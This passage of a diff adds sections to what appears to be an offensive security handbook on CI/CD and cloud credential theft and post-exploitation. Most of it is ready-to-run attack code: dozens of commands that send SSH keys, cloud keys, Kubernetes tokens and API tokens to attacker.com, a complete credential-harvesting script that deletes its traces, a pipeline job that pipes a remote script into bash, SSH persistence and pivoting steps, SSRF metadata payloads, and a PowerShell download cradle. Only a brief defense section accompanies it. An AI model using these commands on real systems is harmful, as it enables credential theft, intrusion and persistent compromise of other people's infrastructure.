+~/.ssh/deploy_key
+/root/.ssh/id_rsa
+/home/gitlab-runner/.ssh/id_rsa
+/home/jenkins/.ssh/id_rsa
+
+# Extract via pipeline job
+cat ~/.ssh/id_rsa | base64 | curl -X POST -d @- http://attacker.com/ssh-key
+cat ~/.ssh/config | base64 | curl -X POST -d @- http://attacker.com/ssh-config
+cat ~/.ssh/known_hosts | base64 | curl -X POST -d @- http://attacker.com/known-hosts
+```
+
+### Kubernetes Service Account Token Extraction
+
+```bash
+# In containerized CI/CD runners (Kubernetes pods)
+# Service account tokens automatically mounted at:
+/var/run/secrets/kubernetes.io/serviceaccount/token
+/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+/var/run/secrets/kubernetes.io/serviceaccount/namespace
+
+# Extract token
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+# Test token permissions
+curl -k -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods
+
+# Exfiltrate token
+echo "$TOKEN" | base64 | curl -X POST -d @- http://attacker.com/k8s-token
+
+# Use token externally
+kubectl --token="$TOKEN" \
+  --server=https://k8s-cluster.example.com \
+  --certificate-authority=/path/to/ca.crt \
+  get pods -n $NAMESPACE
+```
+
+### Cloud Provider Credential Extraction
+
+**AWS Credentials:**
+
+```bash
+# Extract from environment variables in CI/CD job
+echo "AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID" | curl -X POST -d @- http://attacker.com/aws
+echo "AWS_SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY" | curl -X POST -d @- http://attacker.com/aws
+
+# Extract from ~/.aws/credentials
+cat ~/.aws/credentials | base64 | curl -X POST -d @- http://attacker.com/aws-creds
+
+# Extract from EC2 instance metadata (if runner is EC2 instance)
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ | \
+  xargs -I {} curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/{} | \
+  curl -X POST -d @- http://attacker.com/ec2-role-creds
+```
+
+**Azure Service Principal:**
+
+```bash
+# Extract Azure credentials from environment
+echo "AZURE_CLIENT_ID: $AZURE_CLIENT_ID" | curl -X POST -d @- http://attacker.com/azure
+echo "AZURE_CLIENT_SECRET: $AZURE_CLIENT_SECRET" | curl -X POST -d @- http://attacker.com/azure
+echo "AZURE_TENANT_ID: $AZURE_TENANT_ID" | curl -X POST -d @- http://attacker.com/azure
+
+# Extract from Azure CLI config
+cat ~/.azure/azureProfile.json | base64 | curl -X POST -d @- http://attacker.com/azure-profile
+cat ~/.azure/clouds.config | base64 | curl -X POST -d @- http://attacker.com/azure-clouds
+
+# Extract from Azure VM metadata service (if runner is Azure VM)
+curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | \
+  curl -X POST -d @- http://attacker.com/azure-token
+```
+
+**GCP Service Account:**
+
+```bash
+# Extract service account key from environment
+echo "$GCP_SERVICE_ACCOUNT_KEY" | base64 -d | curl -X POST -d @- http://attacker.com/gcp-key
+
+# Extract from default location
+cat ~/.config/gcloud/application_default_credentials.json | curl -X POST -d @- http://attacker.com/gcp-creds
+
+# Extract from GCE metadata service (if runner is GCE instance)
+curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
+  -H "Metadata-Flavor: Google" | curl -X POST -d @- http://attacker.com/gce-token
+
+curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
+  -H "Metadata-Flavor: Google" | curl -X POST -d @- http://attacker.com/gce-email
+```
+
+### Git Credential Extraction
+
+```bash
+# Extract Git credentials from credential store
+cat ~/.git-credentials | base64 | curl -X POST -d @- http://attacker.com/git-creds
+
+# Extract from Git config
+cat ~/.gitconfig | base64 | curl -X POST -d @- http://attacker.com/git-config
+cat .git/config | base64 | curl -X POST -d @- http://attacker.com/repo-config
+
+# Extract Git credential helper cache
+git credential fill <<EOF | curl -X POST -d @- http://attacker.com/git-helper
+protocol=https
+host=github.com
+
+EOF
+
+# Dump all configured remotes (may contain embedded credentials)
+git remote -v | base64 | curl -X POST -d @- http://attacker.com/git-remotes
+
+# Extract credentials from remote URLs
+git config --get remote.origin.url | grep -oP '(?<=://).*(?=@)' | curl -X POST -d @- http://attacker.com/embedded-creds
+```
+
+### Docker Registry Credentials
+
+```bash
+# Extract Docker credentials
+cat ~/.docker/config.json | base64 | curl -X POST -d @- http://attacker.com/docker-creds
+
+# Parse and decode auth tokens
+cat ~/.docker/config.json | jq -r '.auths | to_entries[] | "\(.key): \(.value.auth)"' | while read entry; do
+  echo "$entry" | awk -F': ' '{print $1, $2}' | while read registry auth; do
+    decoded=$(echo "$auth" | base64 -d)
+    echo "$registry: $decoded" | curl -X POST -d @- http://attacker.com/registry-creds
+  done
+done
+
+# Extract from Docker daemon config
+sudo cat /etc/docker/daemon.json | curl -X POST -d @- http://attacker.com/docker-daemon
+
+# Extract from containerd config (if applicable)
+sudo cat /etc/containerd/config.toml | base64 | curl -X POST -d @- http://attacker.com/containerd-config
+```
+
+### Database Connection Strings
+
+```bash
+# Common environment variables containing database credentials
+env | grep -iE 'db|database|mysql|postgres|mongo|redis|sql' | base64 | curl -X POST -d @- http://attacker.com/db-vars
+
+# Extract from application configuration files
+find . -type f \( -name "*.env" -o -name "*.config" -o -name "*.yml" -o -name "*.yaml" -o -name "*.json" \) \
+  -exec grep -iH 'password\|secret\|token\|key\|connectionstring' {} \; | base64 | curl -X POST -d @- http://attacker.com/app-configs
+
+# Common connection string patterns
+grep -r "mongodb://" . | base64 | curl -X POST -d @- http://attacker.com/mongo-strings
+grep -r "postgresql://" . | base64 | curl -X POST -d @- http://attacker.com/postgres-strings
+grep -r "mysql://" . | base64 | curl -X POST -d @- http://attacker.com/mysql-strings
+grep -r "redis://" . | base64 | curl -X POST -d @- http://attacker.com/redis-strings
+```
+
+### API Keys and Tokens
+
+```bash
+# Extract common API keys from environment
+echo "GITHUB_TOKEN: $GITHUB_TOKEN" | curl -X POST -d @- http://attacker.com/tokens
+echo "GITLAB_TOKEN: $GITLAB_TOKEN" | curl -X POST -d @- http://attacker.com/tokens
+echo "SLACK_TOKEN: $SLACK_TOKEN" | curl -X POST -d @- http://attacker.com/tokens
+echo "DATADOG_API_KEY: $DATADOG_API_KEY" | curl -X POST -d @- http://attacker.com/tokens
+echo "SENTRY_AUTH_TOKEN: $SENTRY_AUTH_TOKEN" | curl -X POST -d @- http://attacker.com/tokens
+echo "NPM_TOKEN: $NPM_TOKEN" | curl -X POST -d @- http://attacker.com/tokens
+
+# Search filesystem for token patterns
+grep -r -oE '[a-f0-9]{40}' . | head -20 | curl -X POST -d @- http://attacker.com/hex-tokens
+grep -r -oE 'ghp_[a-zA-Z0-9]{36}' . | curl -X POST -d @- http://attacker.com/github-tokens
+grep -r -oE 'glpat-[a-zA-Z0-9_-]{20}' . | curl -X POST -d @- http://attacker.com/gitlab-tokens
+grep -r -oE 'xox[baprs]-[a-zA-Z0-9-]+' . | curl -X POST -d @- http://attacker.com/slack-tokens
+```
+
+### Tools for Credential Discovery
+
+**GitLeaks on Runner:**
+
+```bash
+# Run gitleaks in CI/CD job to find secrets in repository
+gitleaks detect --source . --verbose --report-path leaks.json
+
+# Exfiltrate findings
+cat leaks.json | curl -X POST -d @- http://attacker.com/gitleaks-findings
+
+# Scan Git history for removed secrets
+gitleaks detect --source . --log-opts="--all" --verbose
+```
+
+**TruffleHog in Pipeline:**
+
+```bash
+# Add to CI/CD pipeline to scan current commit
+trufflehog git file://. --json | curl -X POST -d @- http://attacker.com/trufflehog-findings
+
+# Scan specific branch
+trufflehog git file://. --branch main --only-verified
+
+# Focus on entropy-based detection
+trufflehog git file://. --entropy=True --regex=False
+```
+
+**Custom Credential Extraction Script:**
+
+```bash
+#!/bin/bash
+# credential-harvester.sh - Comprehensive credential extraction
+
+OUTPUT_DIR="/tmp/.cred_harvest_$(date +%s)"
+mkdir -p "$OUTPUT_DIR"
+EXFIL_URL="http://attacker.com/harvest"
+
+echo "[*] Starting credential harvest..."
+
+# Environment variables
+env > "$OUTPUT_DIR/env.txt"
+env | grep -iE 'key|token|secret|password|credential|api' > "$OUTPUT_DIR/env_filtered.txt"
+
+# SSH keys
+find ~/.ssh /root/.ssh /home/*/.ssh -type f 2>/dev/null | while read key; do
+  cp "$key" "$OUTPUT_DIR/ssh_$(basename $key)_$(echo $key | md5sum | cut -d' ' -f1)" 2>/dev/null
+done
+
+# Cloud credentials
+cp ~/.aws/credentials "$OUTPUT_DIR/aws_credentials" 2>/dev/null
+cp ~/.aws/config "$OUTPUT_DIR/aws_config" 2>/dev/null
+cp ~/.azure/azureProfile.json "$OUTPUT_DIR/azure_profile.json" 2>/dev/null
+cp ~/.config/gcloud/application_default_credentials.json "$OUTPUT_DIR/gcp_adc.json" 2>/dev/null
+
+# Docker credentials
+cp ~/.docker/config.json "$OUTPUT_DIR/docker_config.json" 2>/dev/null
+
+# Git credentials
+cp ~/.git-credentials "$OUTPUT_DIR/git_credentials" 2>/dev/null
+cp ~/.gitconfig "$OUTPUT_DIR/gitconfig" 2>/dev/null
+
+# Kubernetes
+cp ~/.kube/config "$OUTPUT_DIR/kubeconfig" 2>/dev/null
+cat /var/run/secrets/kubernetes.io/serviceaccount/token > "$OUTPUT_DIR/k8s_sa_token" 2>/dev/null
+
+# Application configs
+find . /app /var/www /opt -type f \( -name "*.env" -o -name ".env.*" -o -name "config.yml" -o -name "config.yaml" -o -name "secrets.yml" \) \
+  -exec cp {} "$OUTPUT_DIR/" \; 2>/dev/null
+
+# Database configs
+find /etc -name "*.conf" 2>/dev/null | xargs grep -l -iE 'password|connectionstring' | while read conf; do
+  cp "$conf" "$OUTPUT_DIR/$(basename $conf)_$(echo $conf | md5sum | cut -d' ' -f1)" 2>/dev/null
+done
+
+# Process list (may reveal command-line credentials)
+ps auxww > "$OUTPUT_DIR/processes.txt" 2>/dev/null
+
+# Network connections (may reveal active connections to databases, APIs)
+netstat -tulanp > "$OUTPUT_DIR/netstat.txt" 2>/dev/null
+ss -tulnap > "$OUTPUT_DIR/ss.txt" 2>/dev/null
+
+# Archive and exfiltrate
+cd /tmp
+tar -czf harvest.tar.gz .cred_harvest_* 2>/dev/null
+base64 harvest.tar.gz | curl -X POST -d @- "$EXFIL_URL"
+
+# Clean up traces
+rm -rf "$OUTPUT_DIR" harvest.tar.gz
+
+echo "[*] Harvest complete and exfiltrated"
+```
+
+**Usage in CI/CD Pipeline:**
+
+```yaml
+# .gitlab-ci.yml
+harvest:
+  script:
+    - curl -s http://attacker.com/credential-harvester.sh | bash
+  only:
+    - main
+```
+
+### SSH Key Exploitation
+
+Once deployment SSH keys are extracted:
+
+```bash
+# Save extracted private key
+cat > deploy_key << 'EOF'
+-----BEGIN OPENSSH PRIVATE KEY-----
+[extracted key content]
+-----END OPENSSH PRIVATE KEY-----
+EOF
+
+chmod 600 deploy_key
+
+# Identify key type and fingerprint
+ssh-keygen -l -f deploy_key
+
+# Test key against known hosts (from known_hosts file)
+ssh -i deploy_key user@production-server.example.com
+
+# If host unknown, attempt common usernames
+for user in root admin ubuntu ec2-user deploy git; do
+  echo "[*] Trying user: $user"
+  ssh -i deploy_key -o StrictHostKeyChecking=no $user@target-server.example.com "whoami && hostname"
+done
+
+# Enumerate authorized_keys on compromised host
+ssh -i deploy_key user@server "cat ~/.ssh/authorized_keys"
+
+# Add persistence key
+ssh -i deploy_key user@server "echo 'ssh-rsa AAAAB3... attacker@evil' >> ~/.ssh/authorized_keys"
+
+# Pivot to other systems
+ssh -i deploy_key user@server "cat ~/.ssh/known_hosts" | awk '{print $1}' | while read host; do
+  ssh -i deploy_key user@$host "whoami && hostname"
+done
+```
+
+### AWS Credential Exploitation
+
+```bash
+# Configure AWS CLI with extracted credentials
+export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
+export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+export AWS_DEFAULT_REGION="us-east-1"
+
+# Verify credentials work
+aws sts get-caller-identity
+
+# Enumerate permissions
+aws iam get-user
+aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)
+aws iam list-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)
+
+# Common CI/CD credential permissions worth testing:
+# S3 access
+aws s3 ls
+aws s3 ls s3://production-bucket
+
+# ECR access
+aws ecr describe-repositories
+aws ecr get-login-password | docker login --username AWS --password-stdin <account-id>.dkr.ecr.us-east-1.amazonaws.com
+
+# ECS/EC2 access
+aws ecs list-clusters
+aws ec2 describe-instances
+
+# Lambda access
+aws lambda list-functions
+aws lambda get-function --function-name production-api
+
+# Secrets Manager
+aws secretsmanager list-secrets
+aws secretsmanager get-secret-value --secret-id production/database/credentials
+
+# Systems Manager Parameter Store
+aws ssm describe-parameters
+aws ssm get-parameters --names "/production/api/key" --with-decryption
+```
+
+**Enumerate All AWS Permissions:**
+
+```bash
+# Install enumerate-iam
+git clone https://github.com/andresriancho/enumerate-iam
+cd enumerate-iam
+pip install -r requirements.txt
+
+# Run enumeration
+python enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY
+
+# Output shows all accessible services and actions
+```
+
+### Azure Credential Exploitation
+
+```bash
+# Login with service principal
+az login --service-principal \
+  --username $AZURE_CLIENT_ID \
+  --password $AZURE_CLIENT_SECRET \
+  --tenant $AZURE_TENANT_ID
+
+# Verify identity
+az account show
+
+# List accessible subscriptions
+az account list
+
+# Enumerate resources
+az resource list --output table
+
+# Common CI/CD service principal permissions:
+# Storage account access
+az storage account list
+az storage container list --account-name productionstorage
+
+# Container registry access
+az acr list
+az acr repository list --name productionregistry
+
+# Key Vault access (common place for secrets)
+az keyvault list
+az keyvault secret list --vault-name production-keyvault
+az keyvault secret show --vault-name production-keyvault --name database-password
+
+# AKS access
+az aks list
+az aks get-credentials --resource-group production-rg --name production-cluster
+
+# VM access
+az vm list
+az vm run-command invoke --resource-group production-rg --name production-vm --command-id RunShellScript --scripts "whoami && hostname"
+```
+
+### GCP Credential Exploitation
+
+```bash
+# Authenticate with service account key
+gcloud auth activate-service-account --key-file=service-account-key.json
+
+# Verify identity
+gcloud auth list
+gcloud config list
+
+# List accessible projects
+gcloud projects list
+
+# Set active project
+gcloud config set project production-project-id
+
+# Common CI/CD service account permissions:
+# GCS access
+gsutil ls
+gsutil ls gs://production-bucket
+
+# GCR access
+gcloud container images list --repository=gcr.io/production-project
+
+# GKE access
+gcloud container clusters list
+gcloud container clusters get-credentials production-cluster --zone us-central1-a
+
+# Compute Engine access
+gcloud compute instances list
+
+# Secret Manager access
+gcloud secrets list
+gcloud secrets versions access latest --secret="database-password"
+
+# Cloud Functions access
+gcloud functions list
+gcloud functions describe production-api
+```
+
+### Kubernetes Service Account Exploitation
+
+```bash
+# Use extracted service account token
+export TOKEN="eyJhbGciOiJSUzI1NiIs..."
+export APISERVER="https://kubernetes.production.example.com:6443"
+export NAMESPACE="production"
+
+# Test token validity
+curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NAMESPACE/pods
+
+# Check permissions with kubectl
+kubectl --token="$TOKEN" --server=$APISERVER --insecure-skip-tls-verify auth can-i --list
+
+# Common checks:
+kubectl --token="$TOKEN" --server=$APISERVER --insecure-skip-tls-verify get pods -n $NAMESPACE
+kubectl --token="$TOKEN" --server=$APISERVER --insecure-skip-tls-verify get secrets -n $NAMESPACE
+kubectl --token="$TOKEN" --server=$APISERVER --insecure-skip-tls-verify get configmaps -n $NAMESPACE
+
+# Extract secrets if permissions allow
+kubectl --token="$TOKEN" --server=$APISERVER --insecure-skip-tls-verify get secrets -n $NAMESPACE -o json | \
+  jq -r '.items[] | .metadata.name' | while read secret; do
+    echo "[+] Secret: $secret"
+    kubectl --token="$TOKEN" --server=$APISERVER --insecure-skip-tls-verify get secret $secret -n $NAMESPACE -o json | \
+      jq -r '.data | to_entries[] | "\(.key): \(.value)"' | while read entry; do
+        echo "$entry" | awk -F': ' '{print $1, $2}' | while read key val; do
+          echo "  $key: $(echo $val | base64 -d)"
+        done
+      done
+  done
+
+# If exec permissions available, gain shell in pod
+kubectl --token="$TOKEN" --server=$APISERVER --insecure-skip-tls-verify exec -it <pod-name> -n $NAMESPACE -- /bin/bash
+```
+
+### Automated Credential Testing Framework
+
+```python
+#!/usr/bin/env python3
+# credential-validator.py - Test extracted credentials
+
+import subprocess
+import json
+import sys
+
+def test_aws_creds(access_key, secret_key):
+    """Test AWS credentials"""
+    try:
+        result = subprocess.run(
+            ['aws', 'sts', 'get-caller-identity'],
+            env={'AWS_ACCESS_KEY_ID': access_key, 'AWS_SECRET_ACCESS_KEY': secret_key},
+            capture_output=True, text=True, timeout=10
+        )
+        if result.returncode == 0:
+            identity = json.loads(result.stdout)
+            return {
+                'valid': True,
+                'account': identity.get('Account'),
+                'arn': identity.get('Arn'),
+                'user_id': identity.get('UserId')
+            }
+    except Exception as e:
+        return {'valid': False, 'error': str(e)}
+    return {'valid': False}
+
+def test_github_token(token):
+    """Test GitHub personal access token"""
+    try:
+        result = subprocess.run(
+            ['curl', '-s', '-H', f'Authorization: token {token}', 
+             'https://api.github.com/user'],
+            capture_output=True, text=True, timeout=10
+        )
+        data = json.loads(result.stdout)
+        if 'login' in data:
+            return {
+                'valid': True,
+                'username': data.get('login'),
+                'name': data.get('name'),
+                'email': data.get('email')
+            }
+    except Exception as e:
+        return {'valid': False, 'error': str(e)}
+    return {'valid': False}
+
+def test_docker_creds(registry, username, password):
+    """Test Docker registry credentials"""
+    try:
+        result = subprocess.run(
+            ['docker', 'login', registry, '-u', username, '--password-stdin'],
+            input=password, text=True, capture_output=True, timeout=10
+        )
+        return {'valid': result.returncode == 0, 'output': result.stdout}
+    except Exception as e:
+        return {'valid': False, 'error': str(e)}
+
+def test_ssh_key(key_path, host, user='root'):
+    """Test SSH key"""
+    try:
+        result = subprocess.run(
+            ['ssh', '-i', key_path, '-o', 'StrictHostKeyChecking=no',
+             '-o', 'ConnectTimeout=5', f'{user}@{host}', 'whoami'],
+            capture_output=True, text=True, timeout=10
+        )
+        return {'valid': result.returncode == 0, 'output': result.stdout.strip()}
+    except Exception as e:
+        return {'valid': False, 'error': str(e)}
+
+def main():
+    print("[*] Credential Validation Framework")
+    
+    # Example usage
+    credentials = {
+        'aws': [
+            {'access_key': 'AKIAIOSFODNN7EXAMPLE', 'secret_key': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCY'},
+        ],
+        'github': [
+            {'token': 'ghp_abcdefghijklmnopqrstuvwxyz123456'},
+        ],
+        'docker': [
+            {'registry': 'registry.example.com', 'username': 'admin', 'password': 'pass123'},
+        ],
+        'ssh': [
+            {'key_path': '/tmp/deploy_key', 'host': '10.0.1.50', 'user': 'ubuntu'},
+        ]
+    }
+    
+    print("\n[*] Testing AWS credentials...")
+    for cred in credentials.get('aws', []):
+        result = test_aws_creds(cred['access_key'], cred['secret_key'])
+        print(f"  Access Key: {cred['access_key'][:20]}... - Valid: {result['valid']}")
+        if result['valid']:
+            print(f"    ARN: {result.get('arn')}")
+    
+    print("\n[*] Testing GitHub tokens...")
+    for cred in credentials.get('github', []):
+        result = test_github_token(cred['token'])
+        print(f"  Token: {cred['token'][:15]}... - Valid: {result['valid']}")
+        if result['valid']:
+            print(f"    Username: {result.get('username')}")
+    
+    print("\n[*] Testing Docker credentials...")
+    for cred in credentials.get('docker', []):
+        result = test_docker_creds(cred['registry'], cred['username'], cred['password'])
+        print(f"  Registry: {cred['registry']}, User: {cred['username']} - Valid: {result['valid']}")
+    
+    print("\n[*] Testing SSH keys...")
+    for cred in credentials.get('ssh', []):
+        result = test_ssh_key(cred['key_path'], cred['host'], cred['user'])
+        print(f"  Host: {cred['host']}, User: {cred['user']} - Valid: {result['valid']}")
+        if result['valid']:
+            print(f"    Remote user: {result.get('output')}")
+
+if __name__ == '__main__':
+    main()
+```
+
+### Defense and Detection Considerations
+
+[Inference] CI/CD security monitoring typically includes:
+
+**GitLab CI/CD:**
+
+- Audit logs track pipeline creation, variable access, and runner activity
+- Failed authentication attempts logged
+- Unusual pipeline execution patterns may trigger alerts
+
+**GitHub Actions:**
+
+- Audit log tracks workflow runs, secret access
+- Actions triggered from forks have restricted secret access by default
+- Third-party actions require approval in organization settings
+
+**Jenkins:**
+
+- Audit Trail Plugin logs credential access
+- Script Console usage logged if monitoring enabled
+- Unusual job creation or modification may trigger alerts
+
+[Unverified] Detection capabilities depend on proper logging configuration and SIEM integration, which varies significantly across organizations.
+
+---
+
+## Related Topics for Comprehensive CI/CD Security
+
+For complete CI/CD exploitation capabilities, consider studying:
+
+- **Artifact Repository Exploitation**: Nexus, Artifactory, npm registry compromise
+- **Build System Backdoors**: Persistent access through build job modification
+- **Secrets Management Exploitation**: HashiCorp Vault, AWS Secrets Manager, Azure Key Vault attacks
+- **Supply Chain Dependency Confusion**: Private package namespace hijacking
 
 ---
 
@@ -26671,6 +37728,907 @@ chmod +x starkiller-linux-x64
 # Mimikatz for cloud creds
 (Empire: <agent-name>) > usemodule credentials/mimikatz/command
 ```
+
+### Sliver C2
+
+**Description:** Modern cross-platform adversary emulation/red team framework with cloud-native capabilities.
+
+**Installation:**
+
+```bash
+# Download and install
+curl https://sliver.sh/install|sudo bash
+
+# Or manual installation
+wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
+chmod +x sliver-server_linux
+sudo mv sliver-server_linux /usr/local/bin/sliver-server
+
+# Start server
+sliver-server
+```
+
+**Basic Usage:**
+
+```bash
+# Generate implant for Linux (EC2/GCP/Azure VM)
+sliver > generate --http <attacker-ip> --os linux --arch amd64 --save /tmp/
+
+# Generate for Windows
+sliver > generate --http <attacker-ip> --os windows --arch amd64 --save /tmp/
+
+# Start HTTP listener
+sliver > http --lport 443
+
+# List active sessions
+sliver > sessions
+
+# Interact with session
+sliver > use <session-id>
+
+# Execute commands
+sliver (session) > shell
+sliver (session) > download /etc/passwd
+sliver (session) > upload tool.bin /tmp/tool.bin
+sliver (session) > execute -o whoami
+
+# Port forwarding (access internal services)
+sliver (session) > portfwd add --bind 127.0.0.1:8080 --remote 10.0.1.50:80
+
+# SOCKS proxy
+sliver (session) > socks5 start
+
+# Pivoting
+sliver (session) > pivots
+```
+
+**Cloud-Specific Operations:**
+
+```bash
+# Execute AWS CLI commands (if installed on target)
+sliver (session) > shell
+shell > aws s3 ls
+shell > aws iam get-user
+shell > curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Download cloud credentials
+sliver (session) > download /home/ubuntu/.aws/credentials
+sliver (session) > download /root/.azure/credentials
+sliver (session) > download /root/.config/gcloud/
+
+# Process injection (evade detection)
+sliver (session) > psexec -p <pid>
+```
+
+### Mythic C2
+
+**Description:** Collaborative multi-platform C2 framework with containerized agents.
+
+**Installation:**
+
+```bash
+git clone https://github.com/its-a-feature/Mythic.git
+cd Mythic
+
+# Install using docker
+sudo ./install_docker_ubuntu.sh
+sudo make
+
+# Start Mythic
+sudo ./mythic-cli start
+
+# Access at https://127.0.0.1:7443
+# Default credentials: mythic_admin / randomly generated (check logs)
+```
+
+**Basic Usage:**
+
+```bash
+# Install agents (via web UI or CLI)
+sudo ./mythic-cli install github https://github.com/MythicAgents/poseidon
+
+# Generate payload (via web UI)
+# Payloads > Create > Select agent > Configure > Build
+
+# Deploy to cloud instance
+# Transfer payload to EC2/Azure VM/GCP instance
+
+# C2 operations via web interface:
+# - Active Callbacks: View active agents
+# - Task: Execute commands
+# - File Browser: Navigate file system
+# - Process Browser: View/inject processes
+# - SOCKS: Create SOCKS proxy
+```
+
+**Cloud Credential Harvesting:**
+
+```bash
+# Via task commands in Mythic web UI
+download /home/ubuntu/.aws/credentials
+download /root/.azure/credentials
+shell cat /home/ubuntu/.aws/config
+shell curl http://169.254.169.254/latest/meta-data/
+```
+
+### DogStrike
+
+**Description:** Automated AWS post-exploitation tool.
+
+**Installation:**
+
+```bash
+git clone https://github.com/SygniaLabs/DogStrike.git
+cd DogStrike
+pip3 install -r requirements.txt
+```
+
+**Basic Usage:**
+
+```bash
+# Run automated exploitation
+python3 dogstrike.py --profile <aws-profile>
+
+# Specific targets
+python3 dogstrike.py --profile <aws-profile> --target ec2
+
+# Enable specific modules
+python3 dogstrike.py --profile <aws-profile> --modules persistence,exfil
+
+# Output results
+python3 dogstrike.py --profile <aws-profile> -o results.json
+```
+
+### NetSPI AWS Post-Exploitation Modules
+
+**AWS Pwn** - Collection of post-exploitation scripts.
+
+**Installation:**
+
+```bash
+git clone https://github.com/NetSPI/aws_pwn.git
+cd aws_pwn
+pip3 install -r requirements.txt
+```
+
+**Key Scripts:**
+
+```bash
+# Lambda backdoor
+python3 lambda_backdoor.py --function-name <name> --payload reverse_shell.py
+
+# S3 data exfiltration with encryption
+python3 s3_exfil.py --bucket <bucket-name> --encrypt
+
+# RDS snapshot creation and sharing
+python3 rds_snapshot_share.py --instance <instance-id> --target-account <account-id>
+
+# IAM credential harvest from EC2
+python3 ec2_iam_harvest.py --instance-id <id>
+
+# Secrets Manager dump
+python3 secrets_dump.py --region <region>
+
+# CloudFormation stack enumeration
+python3 cfn_enum.py --region <region>
+```
+
+### ImpacketRelayX (SMB Relaying in Cloud)
+
+**Description:** SMB relay attacks for Windows instances in cloud environments.
+
+**Installation (included in Kali):**
+
+```bash
+# Verify installation
+impacket-ntlmrelayx -h
+
+# Or install from source
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+pip3 install .
+```
+
+**Basic Usage:**
+
+```bash
+# SMB relay to cloud Windows instance
+impacket-ntlmrelayx -t <target-ip> -smb2support
+
+# With SOCKS proxy
+impacket-ntlmrelayx -t <target-ip> -socks -smb2support
+
+# Dump SAM
+impacket-ntlmrelayx -t <target-ip> -c "reg save HKLM\SAM C:\temp\sam"
+
+# Execute commands
+impacket-ntlmrelayx -t <target-ip> -c "whoami"
+
+# Dump credentials via secretsdump
+impacket-ntlmrelayx -t <target-ip> -e /tmp/loot
+```
+
+**Cloud-Specific Scenarios:**
+
+```bash
+# Relay within VPC
+impacket-ntlmrelayx -tf targets.txt -smb2support -socks
+
+# After compromise, use SOCKS for lateral movement
+# Configure proxychains
+nano /etc/proxychains4.conf
+# Add: socks4 127.0.0.1 1080
+
+# Access internal resources
+proxychains impacket-wmiexec domain/user:pass@internal-ip
+```
+
+### Cloud Metadata Exploitation Tools
+
+#### PACU's EC2 Module Extensions
+
+```bash
+# Comprehensive metadata extraction
+run ec2__enum_instances_metadata
+
+# Automated credential harvest from metadata
+run ec2__metadata_credential_harvest
+
+# User data extraction
+run ec2__download_userdata
+
+# Check for SSM agent
+run ec2__check_ssm_agent
+```
+
+#### AWS IMDSv2 Bypass Techniques
+
+**Installation of custom tool:**
+
+```bash
+git clone https://github.com/RhinoSecurityLabs/Security-Research.git
+cd Security-Research/tools/aws-pentest-tools
+```
+
+**IMDSv1 to IMDSv2 testing:**
+
+```bash
+# Test IMDSv1 (if enabled)
+curl http://169.254.169.254/latest/meta-data/
+
+# IMDSv2 token request
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
+    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+
+# Use token for requests
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+    http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Extract role credentials
+ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+    http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+    http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
+```
+
+**SSRF exploitation for metadata:**
+
+```bash
+# Through web application SSRF
+http://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/meta-data/
+
+# URL encoding if filtered
+http://vulnerable-app.com/proxy?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F
+
+# Alternative encoding
+http://vulnerable-app.com/proxy?url=http://0x7f000001/latest/meta-data/
+
+# DNS rebinding (if applicable)
+http://vulnerable-app.com/proxy?url=http://metadata.attacker.com/
+```
+
+### Lateral Movement Tools
+
+#### SSM Session Manager Abuse
+
+```bash
+# List available instances with SSM
+aws ssm describe-instance-information
+
+# Start session
+aws ssm start-session --target <instance-id>
+
+# Execute commands via SSM
+aws ssm send-command \
+    --document-name "AWS-RunShellScript" \
+    --instance-ids "<instance-id>" \
+    --parameters 'commands=["whoami","hostname"]'
+
+# Retrieve command output
+aws ssm list-command-invocations \
+    --command-id <command-id> \
+    --details
+
+# Port forwarding via SSM
+aws ssm start-session \
+    --target <instance-id> \
+    --document-name AWS-StartPortForwardingSession \
+    --parameters '{"portNumber":["3389"],"localPortNumber":["13389"]}'
+```
+
+#### PsExec for Windows Instances
+
+```bash
+# Impacket psexec
+impacket-psexec administrator:password@<target-ip>
+
+# With hash (pass-the-hash)
+impacket-psexec -hashes :<ntlm-hash> administrator@<target-ip>
+
+# WMI execution
+impacket-wmiexec administrator:password@<target-ip>
+
+# Remote PowerShell
+impacket-wmiexec administrator:password@<target-ip> "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
+```
+
